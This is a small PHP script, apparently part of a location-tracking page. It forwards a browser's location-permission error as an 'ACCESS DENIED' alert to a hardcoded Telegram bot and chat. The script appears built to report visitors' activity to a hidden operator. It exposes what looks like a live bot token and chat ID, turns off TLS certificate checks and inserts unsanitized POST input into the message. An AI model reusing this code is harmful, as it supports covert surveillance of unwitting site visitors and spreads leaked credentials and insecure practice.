<?php
// ******************************************
// CONFIGURATION
// ******************************************
$botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM";
$chatId = "6862649950";
// ******************************************

$err = $_POST['Error'];

// Format Message
$message = "<b>⚠️ ACCESS DENIED</b>\n\n";
$message .= "<b>Error:</b> " . $err . "\n";
$message .= "The user likely denied location permission.";

// Send to Telegram
$website = "https://api.telegram.org/bot" . $botToken;
$params = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML'
];

$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);
?>
